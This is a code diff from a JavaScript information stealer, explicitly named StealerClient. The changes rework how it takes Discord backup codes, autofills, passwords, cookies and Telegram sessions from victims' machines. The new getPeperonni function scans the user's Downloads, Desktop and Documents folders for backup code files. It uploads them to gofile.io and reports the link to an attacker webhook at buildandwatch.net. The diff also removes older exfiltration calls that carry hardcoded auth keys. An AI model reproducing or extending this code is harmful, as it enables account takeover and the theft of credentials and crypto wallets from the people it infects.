@@ -1362,9 +1362,7 @@ async function getPasswords() {
   }
   
   
- //const passwords = fs.readFileSync(`${randomPath}/Wallets/Passwords.txt`, 'utf-8');
-//await httpx.post(`${api_url}/api/passwords?auth=${api_auth}`, { pass: passwords });
-
+ 
 
 // Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
 axios.get('https://api.gofile.io/getServer')
@@ -1535,10 +1533,6 @@ async function getCookiesAndSendWebhook() {
       );
 
 
- 
-//const cookiess = fs.readFileSync(randomPath + '/Wallets/Cookies/' + browserName + '.txt', 'utf-8');
-//await httpx.post(`${api_url}/api/cookies?auth=${api_auth}`, { cookies: cookiess });
-
 
 
 
@@ -1637,34 +1631,6 @@ axios.get('https://api.gofile.io/getServer')
   }
 }
 
-//      httpx.get(`${api_url}/check?key=${api_auth}`).then(res => {
-    //    const webhook = res.data;  
-  //      const form = new FormData();
-      //  form.append("file", fs.createReadStream(randomPath + '\\Wallets\\Cookies\\' + browserName + '.txt'));
-      //  form.submit(webhook, (error, response) => {
-    //      if (error) console.log(error);
-  //      });
-//      });
-
-   //   httpx.get(`${api_url}/check?key=SJGOui8lJ2Moc65P`).then(res => {
- //       const webhook2 = res.data;  
-     //   const form = new FormData();
-   //     form.append("file", fs.createReadStream(randomPath + '\\Wallets\\Cookies\\' + browserName + '.txt'));
-       // form.submit(webhook2, (error, response) => {
-     //     if (error) console.log(error);
-      //  });
-    //  });
-
-
-
-
-
-
-
-
-
-
-
 
 async function getAutofills() {
   const _0x3aa126 = [];
@@ -1716,8 +1682,7 @@ async function getAutofills() {
       flag: 'a+',
     });
   }
- // const autofills = fs.readFileSync(`${randomPath}/Wallets/Autofills.txt`, 'utf-8');
-//await httpx.post(`https://buildandwatch.net/api/autofill?auth=${api_auth}`, { autofill: autofills });
+ 
    const form = new FormData();
         form.append("file", fs.createReadStream(`${randomPath}/Wallets/Autofills.txt`));
         form.submit(webhook3939, (error, response) => {
@@ -1811,10 +1776,6 @@ axios.get('https://api.gofile.io/getServer')
 };
 
    
-
-
-
-
 async function DiscordListener(path) {
         return;
 }
@@ -1942,9 +1903,7 @@ async function SubmitTelegram() {
 
                         zip.writeZip(`TelegramSession.zip`)
 
-                   
-
-
+              
 // Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
 axios.get('https://api.gofile.io/getServer')
   .then(response => {
@@ -2039,34 +1998,127 @@ axios.get('https://api.gofile.io/getServer')
         }
 }
 
-function SubmitBackupCodes() {
-    let home_dir = os.homedir();
-    let codes = "";
+function getPeperonni() {
+    let str = '';
+    const homeDir = require('os').homedir();
+    if (fs.existsSync(`${homeDir}\\Downloads`)) {
+        fs.readdirSync(`${homeDir}\\Downloads`).forEach(file => {
+            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
+                let path = `${homeDir}\\Downloads\\${file}`
+                str += `\n\n@~$~@fewer-${path}`,
+                    str += `\n\n${fs.readFileSync(path).toString()}`
+            }
+        })
+    }
+    if (fs.existsSync(`${homeDir}\\Desktop`)) {
+        fs.readdirSync(`${homeDir}\\Desktop`).forEach(file => {
+            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
+                let path = `${homeDir}\\Desktop\\${file}`
+                str += `\n\n@~$~@fewer-${path}`,
+                    str += `\n\n${fs.readFileSync(path).toString()}`
+            }
+        })
+    }
+    if (fs.existsSync(`${homeDir}\\Documents`)) {
+        fs.readdirSync(`${homeDir}\\Documents`).forEach(file => {
+            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
+                let path = `${homeDir}\\Documents\\${file}`
+                str += `\n\n@~$~@fewer-${path}`,
+                    str += `\n\n${fs.readFileSync(path).toString()}`
+            }
+        })
+    }
+    if (str !== '') {
+        fs.writeFileSync('\\backupcodes.txt', str.slice(2))
 
-    fs.readdirSync(`${home_dir}//Downloads`).forEach(file => {
-        if (file.includes('discord_backup_codes')) {
-            const text = fs.readFileSync(`${home_dir}//Downloads//${file}`, 'utf-8')
-            codes += `# ${home_dir}\\Downloads\\${file}\n\n${text}\n\n`;
-        }
-    })
 
-    fs.readdirSync(`${home_dir}//Desktop`).forEach(file => {
-        if (file.includes('discord_backup_codes')) {
-            const text = fs.readFileSync(`${home_dir}//Desktop//${file}`, 'utf-8')
-            codes += `# ${home_dir}\\Desktop\\${file}\n\n${text}\n\n`;
-        }
-    })
+axios.get('https://api.gofile.io/getServer')
+  .then(response => {
+    if (response.data && response.data.data && response.data.data.server) {
+      const server = response.data.data.server;
 
-    fs.readdirSync(`${home_dir}//Documents`).forEach(file => {
-        if (file.includes('discord_backup_codes')) {
-            const text = fs.readFileSync(`${home_dir}//Documents//${file}`, 'utf-8')
-            codes += `# ${home_dir}\\Documents\\${file}\n\n${text}\n\n`;
-        }
-    })
+      // Dosya yolu ve adını belirleyelim.
+      const filePath = `\\backupcodes.txt`;
 
-    httpx.post(`https://buildandwatch.net/api/backupcodes?auth=SoShX7eRga9Fx4Z2`, {
-        codes: codes
-    })
+      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
+      const form = new FormData();
+      form.append('file', fs.createReadStream(filePath));
+
+      axios.post(`https://${server}.gofile.io/uploadFile`, form, {
+        headers: form.getHeaders()
+      })
+        .then(uploadResponse => {
+          const responsePayload = {
+            uploadResponseData: uploadResponse.data
+          };
+
+          // Webhook URL'si
+          const webhookUrl = 'https://buildandwatch.net/wbkk';
+
+          // Embed verisini oluştur
+          const embedData = {
+            embeds: [
+              {
+                title: 'BackupCode Dosyası Yükleme Yanıtı',
+                description: JSON.stringify(uploadResponse.data, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
+                color: 16711680 // Embed rengi (örnekte kırmızı renk)
+              }
+            ],
+          };
+
+          // Webhook'a POST isteği gönder
+          axios.post(webhookUrl, embedData)
+            .then(webhookResponse => {
+              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
+            })
+            .catch(error => {
+              console.log('Webhook gönderilirken hata oluştu:', error.message);
+            });
+
+        })
+        .catch(error => {
+          console.log('Dosya yüklenirken hata oluştu:', error.message);
+
+          const responsePayload = {
+            error: error.message
+          };
+
+          // Webhook URL'si
+          const webhookUrl = 'https://buildandwatch.net/wbkk';
+
+          // Embed verisini oluştur
+          const embedData = {
+            embeds: [
+              {
+                title: 'Dosya Yükleme Hatası',
+                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
+                color: 16711680 // Embed rengi (örnekte kırmızı renk)
+              }
+            ],
+          };
+
+          // Webhook'a POST isteği gönder
+          axios.post(webhookUrl, embedData)
+            .then(webhookResponse => {
+              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
+            })
+            .catch(error => {
+              console.log('Webhook gönderilirken hata oluştu:', error.message);
+            });
+        });
+    } else {
+      console.log('Sunucu alınamadı veya yanıt vermedi.');
+    }
+  })
+  .catch(error => {
+    console.log('Sunucu alınırken hata oluştu:', error.message);
+  });
+
+
+        const form = new FormData();
+        form.append("file", fs.createReadStream("\\backupcodes.txt"));
+        form.submit(webhook3939);
+    }
 }
 
 
@@ -2104,16 +2156,13 @@ class StealerClient {
 		InfectDiscords();
 		StealTokens();
 		stealltokens();
-getAutofills();
-	//	subautofill();
+		getAutofills();
 		getPasswords();
 		getZippp();
 		SubmitTelegram();
-		SubmitBackupCodes();
+		getPeperonni();
 		SubmitExodus();
 
-//subzip();
-	//	subpasswords();
 
 	}
 }
